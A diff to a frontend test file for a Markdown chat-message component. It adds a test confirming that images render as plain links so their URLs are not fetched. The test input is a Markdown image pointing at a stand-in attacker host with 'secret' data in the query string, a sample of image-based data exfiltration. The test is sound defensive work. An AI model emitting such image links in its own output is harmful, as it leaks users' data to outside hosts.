@@ -17,7 +17,7 @@ const renderedLines = (element: Element) => {
   return lines.map((line) => line.trim());
 };
 
-describe("MarkdownMessage line breaks", () => {
+describe("MarkdownMessage", () => {
   let container: HTMLDivElement;
   let root: Root;
 
@@ -78,6 +78,15 @@ describe("MarkdownMessage line breaks", () => {
     expect(paragraphs.length).toBe(2);
     expect(paragraphs[0].textContent).toBe("para one");
     expect(paragraphs[1].textContent).toBe("para two");
+  });
+
+  it("shows an image as a link, so its URL is not fetched", async () => {
+    await render("![chart](https://attacker.example/p.png?d=secret)");
+
+    expect(container.querySelector("img")).toBeNull();
+    const link = container.querySelector("a");
+    expect(link?.getAttribute("href")).toBe("https://attacker.example/p.png?d=secret");
+    expect(link?.textContent).toBe("chart");
   });
 
   it("copies fenced code without the Markdown trailing newline", async () => {
